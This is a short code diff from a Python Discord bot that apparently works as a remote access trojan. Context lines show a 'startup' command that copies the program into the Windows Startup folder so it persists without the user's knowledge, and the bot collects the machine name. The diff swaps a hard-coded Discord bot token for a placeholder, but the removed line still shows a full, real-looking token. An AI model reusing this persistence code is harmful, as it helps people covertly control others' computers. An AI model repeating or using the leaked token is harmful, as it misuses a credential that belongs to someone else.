@@ -24,6 +24,8 @@ bot = commands.Bot(command_prefix='?', description=description, intents=intents)
 
 pcname = os.getenv('COMPUTERNAME')
 
+token = 'Your Bot Token'
+
 @bot.event
 async def on_ready():
     print(f'Logged in as {bot.user} (ID: {bot.user.id})')
@@ -187,7 +189,7 @@ async def startup(ctx, reg_name: str):
         shutil.copy(sys.argv[0], os.getenv("appdata")+"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\"+os.path.basename(sys.argv[0]))
         await ctx.send("Permission was denied, added it to `startup folder` instead")
         
-bot.run('MTAzMDA5MjQ5NDM5NTkzNjg1OA.GVZ5Qz.8yxILCUdjJFi05uiNQNuZt_5JnqZLhMZ0sy8yw')
+bot.run(token)
 
 
 
